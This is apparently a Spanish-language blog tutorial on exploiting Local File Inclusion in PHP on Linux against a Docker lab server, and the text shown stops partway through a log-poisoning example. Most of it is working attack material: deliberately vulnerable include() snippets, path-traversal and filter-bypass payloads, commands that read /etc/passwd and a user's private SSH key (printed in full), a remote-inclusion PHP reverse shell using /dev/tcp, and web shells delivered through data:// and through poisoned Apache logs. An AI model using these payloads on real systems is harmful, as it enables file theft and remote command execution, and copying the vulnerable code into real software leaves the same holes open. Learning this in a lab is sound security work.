@@ -1,0 +1,581 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Local File Inclusion Linux</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Local File Inclusion Linux" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Explotación de Local File Inclusion en Linux" />
+<meta property="og:description" content="Explotación de Local File Inclusion en Linux" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Local File Inclusion Linux" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Local File Inclusion Linux" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Explotación de Local File Inclusion en Linux","headline":"Explotación de Local File Inclusion en Linux","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Local File Inclusion Linux</h1>
+          <p>Explotación de Local File Inclusion en Linux</p>
+        </div>
+
+ <div><strong><h3>Preparación</h3></strong></div><br>
+
+<div><p>Para desplegar el entorno utilizé docker, en el contenedor guardar el php en /var/www/html como example.php, no sin antes habilitar el servicio apache2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p"># service apache2 start
+[ </span><span class="s2">ok</span><span class="p"> ] Starting Apache httpd web server: apache2.
+</span><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Explotación (Inclusión de archivos)</h3></strong></div><br>
+
+<div><p>Iniciaremos con un ejemplo básico como el del siguiente programa en php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    </span><span class="kd">include</span><span class="p">($file);
+?></span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¿Cual es la utilidad de este script?</p></div></strong>
+<div><p>El script recibe un archivo que se proporciona mediante el parametro file por el metodo GET, lo almacena en una variable y usa la funcion include para mostrarlo</p></div></blockquote>
+<div><p>Esto es muy sencillo de explotar, ya que podemos acceder a cualquier archivo sin restricciones siempre y cuando tengamos permisos por ejemplo el /etc/passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><span class="p">/etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/etc/passwd"</span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¡Nota importante!</p></div></strong>
+<div><p>El archivo /etc/passwd claramente siempre tendrá más lineas pero se ha recortado para no hacer demasiado grande/repetitivo el artículo</p></div></blockquote><br>
+
+<div><strong><h3>Bypass (Directory Path Traversal)</h3></strong></div><br>
+<div><p>Una posible sanitización usada es hacer que los archivos especificados estén en una ruta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    </span><span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html"</span><span class="kd"> . </span><span class="p">$file);
+?></span>
+</code></pre></div></div><br>
+
+<div><p>Podria parecer una buena idea pero al aplicar un directory path traversal, podemos volver directorios hasta la raiz y apuntar a cualquier archivo nuevamente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><span class="p">../../../../etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=../../../../etc/passwd"</span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Bypass (str_replace)</h3></strong></div><br>
+<div><p>Otra sanitización conocida es usar str_replace para eliminar la string ../ de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    $file </span><span class="kd">=</span><span class="k"> str_replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">, $file);
+    </span><span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html"</span><span class="kd"> .</span><span class="p"> $file);
+?></span>
+</code></pre></div></div><br>
+
+<div><p>El problema es que str_replace solo hace el replace una vez, por lo que podemos bypassearlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">....//     -->     </span><span class="na">..</span><span class="kd">../</span><span class="na">/</span><span class="p">     -->     </span><span class="na">../</span><span class="p">
+</span><span class="p">..././     -->     </span><span class="na">.</span><span class="kd">../</span><span class="na">./</span><span class="p">     -->     </span><span class="na">../</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos usar cualquiera de los dos payloads y bypassear esta restricción</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><span class="p">....//....//....//....//etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=....//....//....//....//etc/passwd"</span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Bypass (Doble str_replace)</h3></strong></div><br>
+<div><p>Otra forma que he visto en casos es que simplemente ponen 2 veces esa linea por ejemplo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    $file </span><span class="kd">=</span><span class="k"> str_replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">, $file);
+    $file </span><span class="kd">=</span><span class="k"> str_replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">, $file);
+    </span><span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html"</span><span class="kd"> .</span><span class="p"> $file);
+?></span>
+</code></pre></div></div><br>
+
+<div><p>Y realmente es la misma logica, solo hay que agregar dos . y una / por cada str_replace</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><span class="p">......///......///......///......///etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=......///......///......///......///etc/passwd"</span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Bypass (Null Byte)</h3></strong></div><br>
+<div><p>Otra sanitización conocida es forzar al archivo deseado adjuntarle la extensión .php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    </span><span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html"</span><span class="kd"> .</span><span class="p"> $file </span><span class="kd">. </span><span class="s2">".php"</span><span class="p">);
+?></span>
+</code></pre></div></div><br>
+
+<div><p>Esto se puede bypassear usando un null byte %00 y cancelando lo que haya despues de lo deseado</p></div>
+<div><p>Cabe aclarar que el ataque contemplando null byte solo funciona hasta la versión 5.3.4 de php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">../../../../etc/passwd%00</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=../../../../etc/passwd%00"</span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Bypass (Wrapper base64)</h3></strong></div><br>
+<div><p>Otra sanitización es comprobar que el archivo no inicie por una / o por .. para evitar todas los bypasses y ataques anteriores</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+    </span><span class="kd">if</span><span class="p"> (</span><span class="k">substr</span><span class="p">($file, </span><span class="na">0</span><span class="p">,</span><span class="na"> 1</span><span class="p">) </span><span class="kd">!==</span><span class="s2"> "/"</span><span class="kd"> &&</span><span class="k"> substr</span><span class="p">($file, </span><span class="na">0</span><span class="p">, </span><span class="na">2</span><span class="p">) </span><span class="kd">!==</span><span class="s2"> ".."</span><span class="p">) {
+        </span><span class="k">include</span><span class="p">($file);
+    }
+?></span>
+</code></pre></div></div><br>
+
+<div><p>Aqui inicia el uso de wrappers, iniciamos con el de base64 que encodea el archivo en base64</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">php://filter/convert.base64-encode/resource=/etc/passwd</span></code></pre></div></div>   
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
+</span><span class="p">cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDI6MTA1Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpzc2hkOng6MTAzOjY1NTM0OjovdmFyL3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnVzZXI6eDoxMDAwOjEwMDA6Oi9ob21lL3VzZXI6L2Jpbi9iYXNoCg==</span>
+</code></pre></div></div><br>
+
+<div><p>Para verlo decodeado hay 2 formas, una haciendo la misma petición y jugar con base64 -d</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=php://filter/convert.base64-encode/resource=/etc/passwd" </span><span class="p">| </span><span class="s2">base64</span><span class="p"> -d
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><p>La otra forma es quitando el -encode en el wrapper asi nos los muestra tal cual</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">php://filter/convert.base64/resource=/etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=php://filter/convert.base64/resource=/etc/passwd" </span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Bypass (Wrapper rot13)</h3></strong></div><br>
+<div><p>Otro wrapper es el de rot13 que rota 13 veces los caracteres del archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">php://filter/read=string.rot13/resource=/etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=php://filter/read=string.rot13/resource=/etc/passwd" </span><span class="p">
+ebbg:k:0:0:ebbg:/ebbg:/ova/onfu
+jjj-qngn:k:33:33:jjj-qngn:/ine/jjj:/hfe/fova/abybtva
+znvy:k:8:8:znvy:/ine/znvy:/hfe/fova/abybtva
+zlfdy:k:102:105:ZlFDY Freire,,,:/abarkvfgrag:/ova/snyfr
+ffuq:k:103:65534::/ine/eha/ffuq:/hfe/fova/abybtva
+hfre:k:1000:1000::/ubzr/hfre:/ova/onfu</span>
+</code></pre></div></div><br>
+
+<div><p>Al agregarle un -decode podemos ver el archivo original sin rotar posiciones</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">php://filter/read=string.rot13-decode/resource=/etc/passwd</span></code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=php://filter/read=string.rot13-decode/resource=/etc/passwd" </span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¿Hay mas wrappers que cumplan esta función?</p></div></strong>
+<div><p>Claramente existen mas wrappers que nos permiten bypassear filtros, pero en este caso solo he usado los 2 mas comunes</p></div></blockquote><br>
+
+<div><strong><h3>Bypass (Badwords - Doubleurlencode)</h3></strong></div><br>
+<div><p>Hay veces que en un script como el siguiente se usa una lista de badwords como .. o /etc/passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    $file </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'file'</span><span class="p">];
+
+    $badwords </span><span class="kd">=</span><span class="k"> array</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2"> "/etc/passwd"</span><span class="p">);
+    </span><span class="k">foreach </span><span class="p">($badwords </span><span class="kd">as</span><span class="p"> $badword) {
+        </span><span class="kd">if</span><span class="p"> (</span><span class="k">strpos</span><span class="p">($file, $badword) </span><span class="kd">!==</span><span class="na"> false</span><span class="p">) {
+            exit();
+        }
+    }
+
+    $file </span><span class="kd">=</span><span class="k"> urldecode</span><span class="p">($file);
+
+    </span><span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html"</span><span class="kd"> . </span><span class="p">$file);
+?></span>
+</code></pre></div></div><br>
+
+<div><p>Podemos usar urlencode 2 veces, en mi caso cree un script para automatizar el proceso facilmente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import </span><span class="p">sys
+
+</span><span class="kd">if</span><span class="k"> len</span><span class="p">(sys.argv) </span><span class="kd"><</span><span class="na"> 2</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n\033[1;37m[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} &ltpath>\n"</span><span class="p">)
+    exit(</span><span class="na">1</span><span class="p">)
+
+</span><span class="kd">def </span><span class="k">doubleurlencode</span><span class="p">(</span><span class="no">string</span><span class="p">):
+
+    urlencode </span><span class="kd">=</span><span class="s2"> ""
+
+    </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">string:
+        decimal </span><span class="kd">=</span><span class="k"> ord</span><span class="p">(character)
+        urlencode </span><span class="kd">+=</span><span class="s2"> "%"</span><span class="kd"> +</span><span class="k"> hex</span><span class="p">(decimal)[</span><span class="na">2</span><span class="p">:]
+
+    double </span><span class="kd">=</span><span class="s2"> ""
+
+    </span><span class="kd">for </span><span class="p">character </span><span class="kd">in</span><span class="p"> urlencode:
+        decimal </span><span class="kd">=</span><span class="k"> ord</span><span class="p">(character)
+        double </span><span class="kd">+=</span><span class="s2"> "%"</span><span class="kd"> +</span><span class="k"> hex</span><span class="p">(decimal)[</span><span class="na">2</span><span class="p">:]
+
+    </span><span class="kd">return</span><span class="p"> double
+
+</span><span class="k">print</span><span class="p">(doubleurlencode(sys.argv[</span><span class="na">1</span><span class="p">]))</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos usarlo pasandole la ruta a la que queremos apuntar y lo dobleurlencodea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py ../../../../etc/passwd
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora simplemente al parametro file le pasamos la ruta dobleurlencodeada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34" </span><span class="p">
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000::/home/user:/bin/bash</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>¿Porque usar solo include en todos los archivos php de los bypass?</p></div></strong>
+<div><p>Include es la funcion mas común pero existen más, como los siguientes por mencionar algunos</p></div>
+<li>include_once</li>
+<li>require_once</li>
+<li>require</li>
+<li>file_get_contents</li>
+<li>fopen</li>
+<li>file</li>
+</blockquote><br><br>
+
+<div><strong><h3>LFI a RCE (via id_rsa)</h3></strong></div><br>
+<div><p>Cuando tenemos un lfi podemos probar si tenemos capacidad de lectura de la id_rsa privada de los usuarios encontrados en el passwd, en este caso user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/home/user/.ssh/id_rsa"</span><span class="p">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDyXSQaU5XPfwM4eUuKS3/Mo/IJUTwTOo2tG9iawjV+cAAAAJhHPuqmRz7q
+pgAAAAtzc2gtZWQyNTUxOQAAACDyXSQaU5XPfwM4eUuKS3/Mo/IJUTwTOo2tG9iawjV+cA
+AAAECmonryEauZzFA1+BPCj2DAVAuQ0i/cYTK4tKeJ2oeD9PJdJBpTlc9/Azh5S4pLf8yj
+8glRPBM6ja0b2JrCNX5wAAAAEXVzZXJAOTI4NGQ2ODc2YmNmAQIDBA==
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div><br>
+
+<div><p>Con la id_rsa nos conectamos por ssh y ejecutamos comandos (si ssh esta habilitado)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> user@172.17.0.2 -i id_rsa
+</span><span class="s2">user@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1002(user) gid=1002(user) groups=1001(user)
+</span><span class="s2">user@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+172.17.0.1
+</span><span class="s2">user@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>RCE (via RFI - Remote File Inclusion)</h3></strong></div><br>
+<div><p>Cuando allow_url_include está habilitado podemos apuntar a un php mediante una url</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p"># grep</span><span class="p"> allow_url_include /etc/php/7.4/apache2/php.ini
+allow_url_include = On
+</span><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<div><p>Para explotarlo creamos un php que ejecute el comando id y lo compartimos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">shell.php       
+&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"id"</span><span class="p">);
+?>
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora en el LFI apuntamos el parametro a la url de nuestro php, nos ejecuta el comando</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=http://172.17.0.1/shell.php"</span><span class="p">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos cambiar el comando id por una reverse shell en nuestro php y lo compartimos de nuevo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">shell.php
+&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'"</span><span class="p">);
+?>
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<div><p>Lo invocamos y ahora conseguimos una shell interactiva como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=http://172.17.0.1/shell.php"</span><span class="p">
+</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 172.17.0.2
+</span><span class="s2">www-data@f5fd61010b2d</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@f5fd61010b2d</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
+172.17.0.2 
+</span><span class="s2">www-data@f5fd61010b2d</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>!Tener en cuenta¡</p></div></strong>
+<div><p>Para no hacerlo repetitivo en los siguientes ataques del articulo omitiré lo de la revshell porque es algo que cuando ejecutas comandos siempre se puede hacer</p></div></blockquote><br>
+
+<div><strong><h3>RCE (via wrapper expect)</h3></strong></div><br>
+<div><p>Cuando el wrapper expect está habilitado podemos ejecutar comandos directamente, no hay más</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=expect://id"</span><span class="p">
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>RCE (via wrapper data)</h3></strong></div><br>
+<div><p>Otra forma es a través del wrapper data, donde pasarle el php malicioso y concatenar un comando</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://172.17.0.2/example.php?file=data://text/plain,&lt?php system($_GET['cmd']); ?>&cmd=id</span>
+</code></pre></div></div><br>
+
+<div><p>Abrimos esto en el navegador y se nos muestra el comando ejecutado en el sistema</p></div>
+<div><p><img src="./1.png"><p></div><br>
+
+<div><p>Si da conflictos podemos hacerlo pasandolo en base64, nos da el mismo resultado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://172.17.0.2/example.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg==&cmd=id</span>
+</code></pre></div></div>
+<div><p><img src="./2.png"><p></div><br>
+
+<div><strong><h3>Log Poisoning (Apache2)</h3></strong></div><br>
+
+<div><p>Para dar capacidad de lectura a los logs podemos cambiar los permisos con chmod</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p"># chmod 775 -R /var/log/apache2
+</span><span class="s2">root@f5fd61010b2d</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+
+<div><p>Cuando tenemos capacidad de lectura en el archivo log de apache podemos ver que al hacer una petición cualquiera deja un log en el archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET http://172.17.0.2/example.php
+</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET</span><span class="no"> "http://localhost/example.php?file=/var/log/apache2/access.log"</span><span class="p">
+172.17.0.1 - - "GET /example.php HTTP/1.1" 200 147 "-" "curl/7.85.0"</span>
+</code></pre></div></div><br>
+
+<div><p>El archivo toma el User Agent y lo guarda, pero esta cabecera es algo que podemos modificar, asi que hacemos una petición con codigo php como User-Agent para que lo guarde como log</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"http://172.17.0.2/example.php"</span><span class="p"> -A </span><span class="no">"&lt?php system(\$_GET['cmd']); ?>"</span><span class="p">
+</span>
+</code></pre></div></div><br>
+
+<div><p>Como la web interpreta php al pasarle un comando en el parametro cmd se interpretará</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET</span><span class="no"> "http://172.17.0.2/example.php?file=/var/log/apache2/access.log&cmd=id"</span><span class="p">
